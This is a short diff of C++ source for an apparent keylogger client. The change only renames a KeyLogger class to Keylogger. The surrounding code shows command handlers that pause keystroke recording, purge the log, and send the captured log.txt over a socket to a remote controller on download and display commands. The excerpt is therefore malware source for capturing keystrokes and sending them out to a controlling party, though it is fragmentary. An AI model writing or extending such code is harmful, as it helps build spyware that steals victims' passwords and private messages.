@@ -26,11 +26,11 @@ void Parser::purgeCommand(t_cmd *command)
 {
 	if (command->cmd == commandType::PURGE_LOG)
 	{
-		KeyLogger::getInstance().stopRecording();
+		Keylogger::getInstance().stopRecording();
 		std::cout << "Log Purge...";
-		KeyLogger::getInstance().purgeLog();
+		Keylogger::getInstance().purgeLog();
 		std::cout << " Done" << std::endl;
-		KeyLogger::getInstance().startRecording();
+		Keylogger::getInstance().startRecording();
 	}
 }
 
@@ -58,7 +58,7 @@ void Parser::downloadCommand(t_cmd *command)
 		std::ifstream file("./log.txt");
 		std::cout << "Sending log...";
 		t_cmd tosend;
-		KeyLogger::getInstance().stopRecording();
+		Keylogger::getInstance().stopRecording();
 		m_client.blockSocket();
 		downloadCommandSendDataLoop(file, tosend);
 		file.close();
@@ -67,7 +67,7 @@ void Parser::downloadCommand(t_cmd *command)
 		m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
 		m_client.unblockSocket();
 		std::cout << " Done" << std::endl;
-		KeyLogger::getInstance().startRecording();
+		Keylogger::getInstance().startRecording();
 	}
 }
 
@@ -91,7 +91,7 @@ void Parser::displayCommand(t_cmd *command)
 		std::ifstream file("./log.txt");
 		std::cout << "Sending log...";
 		t_cmd tosend;
-		KeyLogger::getInstance().stopRecording();
+		Keylogger::getInstance().stopRecording();
 		m_client.blockSocket();
 		displayCommandSendDataLoop(file, tosend);
 		file.close();
@@ -100,7 +100,7 @@ void Parser::displayCommand(t_cmd *command)
 		m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
 		m_client.unblockSocket();
 		std::cout << " Done" << std::endl;
-		KeyLogger::getInstance().startRecording();
+		Keylogger::getInstance().startRecording();
 	}
 }
 
